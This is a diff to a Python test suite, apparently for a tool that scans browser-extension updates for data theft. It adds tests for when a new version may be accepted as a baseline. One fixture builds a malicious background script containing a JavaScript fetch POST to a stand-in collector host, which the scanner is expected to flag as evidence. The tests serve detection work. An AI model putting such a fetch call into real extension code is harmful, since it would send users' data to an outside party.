@@ -252,12 +252,28 @@ class TestPipeline:
         assert report["baseline"]["recorded"] is True
         assert load_profile(None, "DLP Vendor")["version"] == "24.10.4"
 
-    def test_accept_baseline_never_applies_to_high(self, tmp_path, capsys, temp_history_file):
+    def test_accept_baseline_never_applies_with_evidence(self, tmp_path, capsys, temp_history_file):
+        _scan(capsys, _write_zip(tmp_path, "v1.zip", "24.10.3", CLEAN_BG))
+        exfil_bg = CLEAN_BG + "\nfetch('https://collect-x.workers.dev/c', {method: 'POST'});\n"
+        report = _scan(
+            capsys, _write_zip(tmp_path, "v2.zip", "24.10.4", exfil_bg), "--accept-baseline"
+        )
+        assert report["verdict"]["evidence"]
+        assert report["baseline"]["recorded"] is False
+
+    def test_reviewed_high_without_evidence_can_be_accepted(
+        self, tmp_path, capsys, temp_history_file
+    ):
+        """An update adding endpoints + cookies is an ANOMALY (HIGH), not proof.
+        Without --accept-baseline after review it would stay HIGH forever."""
         _scan(capsys, _write_zip(tmp_path, "v1.zip", "24.10.3", CLEAN_BG))
         v2 = _write_zip(tmp_path, "v2.zip", "24.10.4", HIJACKED_BG)
-        report = _scan(capsys, v2, "--accept-baseline")
-        assert report["risk_level"] in ("high", "critical")
-        assert report["baseline"]["recorded"] is False
+        first = _scan(capsys, v2)
+        assert first["risk_level"] == "high" and not first["verdict"]["evidence"]
+        assert first["baseline"]["recorded"] is False
+        assert "--accept-baseline" in first["baseline"]["reason"]
+        accepted = _scan(capsys, v2, "--accept-baseline")
+        assert accepted["baseline"]["recorded"] is True
 
     def test_new_exfil_endpoint_in_an_update_is_at_least_high(
         self, tmp_path, capsys, temp_history_file
